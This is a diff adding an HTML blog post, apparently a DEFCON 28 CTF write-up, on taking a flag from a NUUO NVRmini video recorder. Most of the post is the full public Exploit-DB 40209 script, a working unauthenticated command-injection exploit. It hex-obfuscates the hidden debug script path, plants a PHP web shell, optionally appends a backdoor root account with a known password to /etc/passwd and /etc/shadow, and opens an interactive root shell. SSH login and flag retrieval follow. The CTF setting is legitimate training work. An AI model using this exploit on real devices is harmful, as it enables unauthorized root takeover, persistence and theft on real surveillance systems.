@@ -1,0 +1,171 @@
+<!doctype html><html lang=en><meta charset=utf-8><meta name=generator content="Hugo 0.74.3"><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><meta name=color-scheme content="light dark"><meta name=supported-color-schemes content="light dark"><title>Nuuo NVR Mini Flag&nbsp;&ndash;&nbsp;weslack</title><link rel=stylesheet href=/css/core.min.be501171008d95a30f958daa62c92e4cf1c096f8eb655590a575c3934e35a2ff1f22631f406912aa455f8417fd84bacb.css integrity=sha384-vlARcQCNlaMPlY2qYskuTPHAlvjrZVWQpXXDk041ov8fImMfQGkSqkVfhBf9hLrL><meta name=twitter:card content="summary"><meta name=twitter:title content="Nuuo NVR Mini Flag"><body><section id=header><div class="header wrap"><span class="header left-side"><a class="site home" href=/><img class="site logo" src=/logo.png alt><span class="site name">weslack</span></a></span>
+<span class="header right-side"><div class="nav wrap"><nav class=nav><a class="nav item" href=/categories/>Categories</a><a class="nav item" href=/tags/>Tags</a><a class="nav item" href=/about/>About</a><a class="nav item" href=https://github%2ecom/weslack target=_blank>GitHub</a></nav></div></span></div><div class="site slogan"><span class=title>DEFCON 28 CTF Fun</span></div></section><section id=content><div class=article-container><section class="article header"><h1 class="article title">Nuuo NVR Mini Flag</h1><p class="article date">Fri, 07 Aug 2020 21:02:15</p></section><article class="article markdown-body"><p>We were able to get the flag off of our first device using a known exploit. We found this known exploit by searching for the device + exploit in to Google. We found the following vulnerability in Exploit Database.</p><p><a href=https://www.exploit-db.com/exploits/40209 target=_blank>https://www.exploit-db.com/exploits/40209</a></p><h1 id=script>Script</h1><div class=highlight><pre class=chroma><code class=language-python data-lang=python><span class=ch>#!/usr/bin/env python</span>
+<span class=c1>#</span>
+<span class=c1>#</span>
+<span class=c1># NUUO Remote Root Exploit</span>
+<span class=c1>#</span>
+<span class=c1>#</span>
+<span class=c1># Vendor: NUUO Inc.</span>
+<span class=c1># Product web page: http://www.nuuo.com</span>
+<span class=c1># Affected version: &lt;=3.0.8</span>
+<span class=c1>#</span>
+<span class=c1># Summary: NUUO NVRmini 2 is the lightweight, portable NVR solution with NAS</span>
+<span class=c1># functionality. Setup is simple and easy, with automatic port forwarding</span>
+<span class=c1># settings built in. NVRmini 2 supports POS integration, making this the perfect</span>
+<span class=c1># solution for small retail chain stores. NVRmini 2 also comes full equipped as</span>
+<span class=c1># a NAS, so you can enjoy the full storage benefits like easy hard drive hot-swapping</span>
+<span class=c1># and RAID functions for data protection. Choose NVR and know that your valuable video</span>
+<span class=c1># data is safe, always.</span>
+<span class=c1>#</span>
+<span class=c1># Desc: NUUO NVRmini, NVRmini2, Crystal and NVRSolo suffers from an unauthenticated command</span>
+<span class=c1># injection vulnerability. Due to an undocumented and hidden debugging script, an attacker</span>
+<span class=c1># can inject and execute arbitrary code as the root user via the &#39;log&#39; GET parameter in the </span>
+<span class=c1># &#39;__debugging_center_utils___.php&#39; script.</span>
+<span class=c1>#</span>
+<span class=c1># -----------------------------------------------------</span>
+<span class=c1># $ nuuo.py 10.0.0.17 80</span>
+<span class=c1># [*] ==============================================</span>
+<span class=c1># [*] NUUO NVR/DVR/NDVR Remote Root Exploit</span>
+<span class=c1># [*] Zero Science Lab - http://www.zeroscience.mk</span>
+<span class=c1># [*] ==============================================</span>
+<span class=c1># [*] Backdoor detected!</span>
+<span class=c1># [*] Add root user (y/n)? n</span>
+<span class=c1># [*] Press [ ENTER ] to start root shell...</span>
+<span class=c1>#</span>
+<span class=c1># root@nuuo:~# id</span>
+<span class=c1># uid=0(root) gid=0(root)</span>
+<span class=c1>#</span>
+<span class=c1># root@nuuo:~# exit</span>
+<span class=c1>#</span>
+<span class=c1># [*] Removing raidh.php file</span>
+<span class=c1># [*] Session terminated!</span>
+<span class=c1>#</span>
+<span class=c1># $</span>
+<span class=c1># -----------------------------------------------------</span>
+<span class=c1>#</span>
+<span class=c1># Tested on: GNU/Linux 3.0.8 (armv7l)</span>
+<span class=c1>#            GNU/Linux 2.6.31.8 (armv5tel)</span>
+<span class=c1>#            lighttpd/1.4.28</span>
+<span class=c1>#            PHP/5.5.3</span>
+<span class=c1>#</span>
+<span class=c1>#</span>
+<span class=c1># Vulnerability discovered by Gjoko &#39;LiquidWorm&#39; Krstic</span>
+<span class=c1># Zero Science Lab - http://www.zeroscience.mk</span>
+<span class=c1>#</span>
+<span class=c1>#</span>
+<span class=c1># Advisory ID: ZSL-2016-5348</span>
+<span class=c1># Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5348.php</span>
+<span class=c1># NSE Script: http://www.zeroscience.mk/codes/nuuo-backdoor.nse</span>
+<span class=c1># https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/40209.zip</span>
+<span class=c1>#</span>
+<span class=c1>#</span>
+<span class=c1># 14.01.2016</span>
+<span class=c1>#</span>
+
+<span class=kn>import</span> <span class=nn>os</span><span class=c1>######</span>
+<span class=kn>import</span> <span class=nn>sys</span><span class=c1>#####</span>
+<span class=kn>import</span> <span class=nn>time</span><span class=c1>####</span>
+<span class=kn>import</span> <span class=nn>urllib</span><span class=c1>##</span>
+<span class=kn>import</span> <span class=nn>binascii</span>
+<span class=kn>import</span> <span class=nn>requests</span>
+ 
+<span class=n>__author__</span> <span class=o>=</span> <span class=s1>&#39;lqwrm&#39;</span>
+
+<span class=k>def</span> <span class=nf>persist</span><span class=p>(</span><span class=n>host</span><span class=p>,</span><span class=n>port</span><span class=p>,</span><span class=n>hexy</span><span class=p>,</span><span class=n>clean</span><span class=p>):</span>
+
+    <span class=n>pwd</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;echo &#39;roOt:x:0:0:PWNED account:/:/bin/bash&#39; &gt;&gt; /etc/passwd&#39;&#39;&#39;</span>
+    <span class=n>sdw</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;echo &#39;roOt:$1$MJOnV/Y3$tDnMIBMy0lEQ2kDpfgTJP0:16914:0:99999:7:::&#39; &gt;&gt; /etc/shadow&#39;&#39;&#39;</span>
+    <span class=k>print</span> <span class=s1>&#39;[*] Adding user </span><span class=se>\&#39;</span><span class=s1>roOt</span><span class=se>\&#39;</span><span class=s1> with password </span><span class=se>\&#39;</span><span class=s1>rewt</span><span class=se>\&#39;</span><span class=s1> in passwd file.&#39;</span>
+    <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http://&#39;</span><span class=o>+</span><span class=n>host</span><span class=o>+</span><span class=s1>&#39;:&#39;</span><span class=o>+</span><span class=n>port</span><span class=o>+</span><span class=s1>&#39;/raidh.php?cmd=&#39;</span><span class=o>+</span><span class=n>pwd</span><span class=p>)</span>
+    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
+    
+    <span class=k>print</span> <span class=s1>&#39;[*] Updating shadow file.&#39;</span>
+    <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http://&#39;</span><span class=o>+</span><span class=n>host</span><span class=o>+</span><span class=s1>&#39;:&#39;</span><span class=o>+</span><span class=n>port</span><span class=o>+</span><span class=s1>&#39;/raidh.php?cmd=&#39;</span><span class=o>+</span><span class=n>sdw</span><span class=p>)</span>
+    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
+    
+    <span class=k>print</span> <span class=s1>&#39;[*] Shell awaits: ssh roOt@&#39;</span><span class=o>+</span><span class=n>host</span>
+    <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http://&#39;</span><span class=o>+</span><span class=n>host</span><span class=o>+</span><span class=s1>&#39;:&#39;</span><span class=o>+</span><span class=n>port</span><span class=o>+</span><span class=s1>&#39;/raidh.php?cmd=&#39;</span><span class=o>+</span><span class=n>urllib</span><span class=o>.</span><span class=n>quote</span><span class=p>(</span><span class=n>clean</span><span class=p>))</span>
+    <span class=nb>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+
+<span class=k>def</span> <span class=nf>check</span><span class=p>(</span><span class=n>host</span><span class=p>,</span><span class=n>port</span><span class=p>,</span><span class=n>hexy</span><span class=p>):</span>
+
+    <span class=k>try</span><span class=p>:</span>
+        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http://&#39;</span><span class=o>+</span><span class=n>host</span><span class=o>+</span><span class=s1>&#39;:&#39;</span><span class=o>+</span><span class=n>port</span><span class=o>+</span><span class=s1>&#39;/&#39;</span><span class=o>+</span><span class=n>hexy</span><span class=p>,</span> <span class=n>allow_redirects</span><span class=o>=</span><span class=bp>False</span><span class=p>)</span>
+        <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
+            <span class=k>print</span> <span class=s1>&#39;[*] Backdoor detected!&#39;</span>
+            <span class=k>pass</span>
+        <span class=k>else</span><span class=p>:</span>
+            <span class=k>print</span> <span class=s1>&#39;[*] No backdoors here. :(&#39;</span>
+            <span class=nb>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+    <span class=k>except</span> <span class=ne>Exception</span><span class=p>:</span>
+        <span class=k>print</span> <span class=s1>&#39;[*] Could not connect.&#39;</span>
+        <span class=nb>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+
+<span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
+
+    <span class=k>print</span> <span class=s1>&#39;[*] ==============================================&#39;</span>
+    <span class=k>print</span> <span class=s1>&#39;[*] NUUO NVR/DVR/NDVR Remote Root Exploit&#39;</span>
+    <span class=k>print</span> <span class=s1>&#39;[*] Zero Science Lab - http://www.zeroscience.mk&#39;</span>
+    <span class=k>print</span> <span class=s1>&#39;[*] ==============================================&#39;</span>
+
+    <span class=k>if</span> <span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span> <span class=o>&lt;=</span> <span class=mi>2</span><span class=p>):</span>
+        <span class=k>print</span> <span class=s1>&#39;[*] Usage: nuuo.py &lt;ipaddress&gt; &lt;port&gt;&#39;</span>
+        <span class=nb>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+
+    <span class=n>host</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
+    <span class=n>port</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
+
+    <span class=n>dbgcu</span> <span class=o>=</span> <span class=s1>&#39;5f5f64&#39;</span><span class=c1>#</span>
+    <span class=n>dbgcu</span><span class=o>+=</span> <span class=s1>&#39;656275&#39;</span><span class=c1>#</span>
+    <span class=n>dbgcu</span><span class=o>+=</span> <span class=s1>&#39;676769&#39;</span><span class=c1>#</span>
+    <span class=n>dbgcu</span><span class=o>+=</span> <span class=s1>&#39;6e675f&#39;</span><span class=c1>#</span>
+    <span class=n>dbgcu</span><span class=o>+=</span> <span class=s1>&#39;63656e&#39;</span><span class=c1>#</span>
+    <span class=n>dbgcu</span><span class=o>+=</span> <span class=s1>&#39;746572&#39;</span><span class=c1>#</span>
+    <span class=n>dbgcu</span><span class=o>+=</span> <span class=s1>&#39;5f7574&#39;</span><span class=c1>#</span>
+    <span class=n>dbgcu</span><span class=o>+=</span> <span class=s1>&#39;696c73&#39;</span><span class=c1>#</span>
+    <span class=n>dbgcu</span><span class=o>+=</span> <span class=s1>&#39;5f5f5f&#39;</span><span class=c1>#</span>
+    <span class=n>dbgcu</span><span class=o>+=</span> <span class=s1>&#39;2e7068&#39;</span><span class=c1>#</span>
+    <span class=n>dbgcu</span><span class=o>+=</span> <span class=s1>&#39;70&#39;</span><span class=c1>###&#39;#</span>
+
+    <span class=n>hexy</span> <span class=o>=</span> <span class=n>binascii</span><span class=o>.</span><span class=n>unhexlify</span><span class=p>(</span><span class=n>dbgcu</span><span class=p>)</span>
+    <span class=n>check</span> <span class=p>(</span><span class=n>host</span><span class=p>,</span><span class=n>port</span><span class=p>,</span><span class=n>hexy</span><span class=p>)</span>
+
+    <span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;echo &#34;&lt;?php system(\$_REQUEST[</span><span class=se>\&#39;</span><span class=s1>cmd</span><span class=se>\&#39;</span><span class=s1>]); ?&gt;&#34; &gt; raidh.php&#39;&#39;&#39;</span>
+    <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http://&#39;</span><span class=o>+</span><span class=n>host</span><span class=o>+</span><span class=s1>&#39;:&#39;</span><span class=o>+</span><span class=n>port</span><span class=o>+</span><span class=s1>&#39;/&#39;</span><span class=o>+</span><span class=n>hexy</span><span class=o>+</span><span class=s1>&#39;?log=1337;&#39;</span> <span class=o>+</span> <span class=n>payload</span><span class=p>)</span>
+
+    <span class=n>clean</span> <span class=o>=</span> <span class=s1>&#39;rm raidh.php&#39;</span>
+    <span class=n>a1</span> <span class=o>=</span> <span class=nb>raw_input</span><span class=p>(</span><span class=s1>&#39;[*] Add root user (y/n)? &#39;</span><span class=p>)</span>
+    <span class=k>if</span> <span class=n>a1</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span> <span class=o>==</span> <span class=s1>&#39;y&#39;</span> <span class=ow>or</span> <span class=n>a1</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span> <span class=o>==</span> <span class=s1>&#39;Y&#39;</span><span class=p>:</span>
+        <span class=n>persist</span> <span class=p>(</span><span class=n>host</span><span class=p>,</span><span class=n>port</span><span class=p>,</span><span class=n>hexy</span><span class=p>,</span><span class=n>clean</span><span class=p>)</span>
+    <span class=k>else</span><span class=p>:</span>
+        <span class=k>pass</span>
+
+    <span class=k>print</span> <span class=s1>&#39;[*] Press [ ENTER ] to start root shell...&#39;</span>
+    <span class=nb>raw_input</span><span class=p>()</span>
+
+    <span class=k>while</span> <span class=bp>True</span><span class=p>:</span>
+        <span class=k>try</span><span class=p>:</span>
+            <span class=n>cmd</span> <span class=o>=</span> <span class=nb>raw_input</span><span class=p>(</span><span class=s1>&#39;root@nuuo:~# &#39;</span><span class=p>)</span>
+            <span class=k>if</span> <span class=n>cmd</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span> <span class=o>==</span> <span class=s1>&#39;&#39;</span><span class=p>:</span>
+                <span class=k>print</span> <span class=s1>&#39;[*] Give me a command!</span><span class=se>\n</span><span class=s1>&#39;</span>
+                <span class=k>continue</span>
+            <span class=k>else</span><span class=p>:</span>
+                <span class=n>e</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http://&#39;</span><span class=o>+</span><span class=n>host</span><span class=o>+</span><span class=s1>&#39;:&#39;</span><span class=o>+</span><span class=n>port</span><span class=o>+</span><span class=s1>&#39;/raidh.php?cmd=&#39;</span><span class=o>+</span><span class=n>urllib</span><span class=o>.</span><span class=n>quote</span><span class=p>(</span><span class=n>cmd</span><span class=p>))</span>
+                <span class=k>print</span> <span class=n>e</span><span class=o>.</span><span class=n>text</span>
+            <span class=k>if</span> <span class=n>cmd</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span> <span class=o>==</span> <span class=s1>&#39;exit&#39;</span><span class=p>:</span>
+                <span class=k>print</span> <span class=s1>&#39;[*] Removing raidh.php file&#39;</span>
+                <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http://&#39;</span><span class=o>+</span><span class=n>host</span><span class=o>+</span><span class=s1>&#39;:&#39;</span><span class=o>+</span><span class=n>port</span><span class=o>+</span><span class=s1>&#39;/raidh.php?cmd=&#39;</span><span class=o>+</span><span class=n>urllib</span><span class=o>.</span><span class=n>quote</span><span class=p>(</span><span class=n>clean</span><span class=p>))</span>
+                <span class=k>print</span> <span class=s1>&#39;[*] Session terminated!&#39;</span>
+                <span class=k>break</span>
+        <span class=k>except</span> <span class=ne>Exception</span><span class=p>:</span>
+            <span class=k>break</span>
+
+<span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+    <span class=n>main</span><span class=p>()</span>
+
+</code></pre></div><h2 id=getting-access>Getting access</h2><p>After running this script, we were able to log in with the credentails we added to the device.</p><div class=highlight><pre class=chroma><code class=language-sh data-lang=sh>ssh roOt@192.168.10.193
+</code></pre></div><p>We will log in with the password that was created, <code>rewt</code>.</p><h2 id=grabbing-the-flag>Grabbing the flag</h2><p>The CTF challenge says that we need to get the flag off of the USB. We navigate to the mounted USB drive via</p><div class=highlight><pre class=chroma><code class=language-sh data-lang=sh>-bash-3.2# <span class=nb>cd</span> /mnt/USB1/
+-bash-3.2# ls
+USB1        flag.txt    lost+found
+-bash-3.2# cat flag.txt 
+</code></pre></div></article><section class="article labels"><a class=category href=/categories/sohoplessly-broken/>SOHOplessly Broken</a><a class=tag href=/tags/known-exploit/>known exploit</a><a class=tag href=/tags/easy/>easy</a></section></div><div class="article bottom"><section class="article navigation"><p><a class=link href=/post/initial-port-scan/><span class="iconfont icon-article"></span>Initial Port Scan</a></p><p><a class=link href=/post/website/><span class="iconfont icon-article"></span>Website</a></p></section></div></section><section id=footer><div class=footer-wrap><p class=copyright>All content is free, unencumbered, and released into the public domain. Do with it what you want. <a href=/LICENSE.txt>Unlicense</a></p><p class=powerby><span>Powered&nbsp;by&nbsp;</span><a href=https://gohugo.io target=_blank>Hugo</a><span>&nbsp;&&nbsp;</span><a href=https://themes.gohugo.io/hugo-notepadium/ target=_blank>Notepadium</a></p></div></section></body></html>
